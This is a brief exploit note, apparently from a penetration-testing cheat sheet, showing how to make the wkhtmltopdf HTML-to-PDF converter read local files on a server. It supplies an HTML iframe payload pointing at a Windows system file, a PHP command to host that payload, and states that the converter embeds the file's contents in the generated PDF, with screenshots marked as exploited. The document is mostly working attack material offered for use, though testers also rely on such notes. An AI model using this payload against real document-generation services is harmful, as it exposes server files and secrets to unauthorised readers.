# wkhtmltopdf - File Read

HTML file hosted on web server to read local files via iframe:

```html
<iframe src="C:/Windows/system32/drivers/etc/hosts" height="1000" width="1000"></iframe>
```

Start web server:

```bash
php -S 0.0.0.0:81
```

wkhtmltopdf will fetch and convert our HTML, including the local file content:

[image]

Exploited:

[image]
